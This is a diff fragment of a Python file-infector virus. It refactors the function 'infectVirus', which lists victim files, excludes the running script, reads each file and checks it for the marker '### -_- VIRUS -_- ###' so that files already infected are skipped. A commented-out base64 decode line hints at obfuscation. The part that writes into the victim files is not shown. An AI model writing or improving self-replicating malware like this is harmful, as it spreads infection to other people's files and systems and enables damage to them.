@@ -17,13 +17,15 @@ def infectVirus():
     victims = find_victims()
     victims.remove(sys.argv[0])
     for victim in victims:
-        fileHandler = open(victim,"r")
-        programCode = fileHandler.readlines()
+        with open(victim,"r") as fh:
+            codeLines = fh.readlines()
+        with open(victim,"r") as fh:
+            programCode = fh.read()
+            
         #decrypedCode = base64.b64decode(programCode)
-        fileHandler.close()
         infected = False
-        for line in programCode:
-            if("### -_- VIRUS -_- ###" in line):
+        for codeLine in codeLines:
+            if("### -_- VIRUS -_- ###" in codeLine):
                 infected = True
                 break
         
